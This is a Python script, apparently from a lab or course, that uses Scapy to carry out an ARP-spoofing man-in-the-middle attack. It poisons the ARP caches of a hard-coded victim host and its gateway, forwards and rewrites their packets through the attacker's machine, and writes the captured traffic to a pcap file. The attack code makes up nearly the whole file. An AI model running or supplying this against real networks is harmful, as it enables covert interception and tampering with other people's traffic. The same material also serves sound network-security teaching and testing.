"""
Sniff for packets.
If we encounter an ARP packet
    we craft an ARP response - set destination as sender, src MAC as self and IP as request destination.
    (maybe we need to do the same for ICMP)

Author: Alex Breger
Reviewed by: Ben Bortkevich
"""

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, ARP, arping, sendp
from scapy.sendrecv import send, sniff
from scapy.utils import wrpcap

gateway_ip = "10.10.0.254"
victim_ip = "10.10.2.59"
#victim_ip = "10.10.2.51"
attacker_mac = get_if_hwaddr(conf.iface)
interface = conf.iface


def get_mac(ip):
    answered, unanswered = arping(ip)
    for sent, recieved in answered:
        return recieved[Ether].src


def spoof():
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    #while True:
    send_arp_victim = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip)
    sendp(send_arp_victim, iface=interface, verbose=0)

    send_arp_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip)
    sendp(send_arp_gateway, iface=interface, verbose=0)

    #time.sleep(2)

def restore(gateway_ip, victim_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    send_arp_victim = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac)
    sendp(send_arp_victim, iface=interface, verbose=0)

    send_arp_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
    sendp(send_arp_gateway, iface=interface, verbose=0)


def sniffer():
    packets = sniff(iface=interface, count=1, prn=middle_man, timeout=0.1)
    wrpcap("temp.pcap", packets)


def middle_man(packet):
    if IP in packet:
        if packet.src == victim_ip:
            packet[Ether].src = attacker_mac
            packet[Ether].dst = get_mac(gateway_ip)
            del packet[IP].chksum
            sendp(packet, iface=interface)
        elif packet.src == gateway_ip:
            packet[Ether].src = attacker_mac
            packet[Ether].dst = get_mac(victim_ip)
            del packet[IP].chksum
            sendp(packet, iface=interface)


if __name__ == "__main__":
    while True:
        try:
            spoof()
            sniffer()

        except KeyboardInterrupt:
            break